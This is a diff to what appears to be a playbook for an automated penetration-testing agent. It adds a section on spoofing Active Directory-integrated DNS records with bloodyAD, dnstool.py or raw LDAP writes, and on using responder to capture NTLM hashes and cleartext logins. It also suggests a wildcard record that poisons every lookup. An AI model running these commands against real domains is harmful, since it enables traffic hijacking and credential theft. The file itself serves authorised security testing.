@@ -45,8 +45,29 @@ each step returns. The named tools are the capability to reach for.
 6. **Password spraying — last resort.** Only after the policy is understood and within
    the lockout discipline above; one password at a time.
 
-Net-NTLMv2 capture via a discovered NTLM-authenticating web service is in play;
-LLMNR/NBNS poisoning is out of scope here (needs a network-position tool).
+Net-NTLMv2 capture via a discovered NTLM-authenticating web service is in play; so is
+ADIDNS record spoofing (below). LLMNR/NBNS poisoning is out of scope here (needs a
+network-position tool).
+
+## ADIDNS — spoof a DNS record to redirect traffic and capture auth
+AD-integrated DNS stores its zones in LDAP, and by default **any authenticated domain user
+can create new records** in the zone. Add a record for a name the target resolves and acts
+on, point it at your host, and you redirect that traffic to you — no network position needed
+(unlike LLMNR/NBNS). This is the move that turns low-priv domain creds into NTLM/cleartext
+capture. The commands below are **examples** — compose your own.
+- Example (bloodyAD): `bloodyAD -u <user> -p <pass> -d <domain> --host <dc> add dnsRecord <name> <your-ip>`
+- Example (krbrelayx dnstool): `dnstool.py -u '<domain>\<user>' -p <pass> -a add -r <name> -d <your-ip> <dc>`
+- Example (direct LDAP): write a `dnsNode` with a crafted `dnsRecord` blob under
+  `DC=DomainDnsZones,DC=<domain>` — works when no dedicated tool is present
+Then capture: run responder via `run_daemon`, trigger (or wait for) the lookup, and read the
+NetNTLMv2 hash or cleartext login from the capture.
+
+look for: authenticated domain creds (the only prerequisite) and a name the target will resolve
+and connect to — a **linked-server / SQL hostname**, a service doing name lookups, a missing
+`wpad`. A `*` wildcard record poisons every unresolved lookup in the zone.
+
+record: ADIDNS is a domain modification — `record_persistence` the record with the exact LDAP
+delete as `cleanup`, and remove it when done.
 
 ## What to record
 
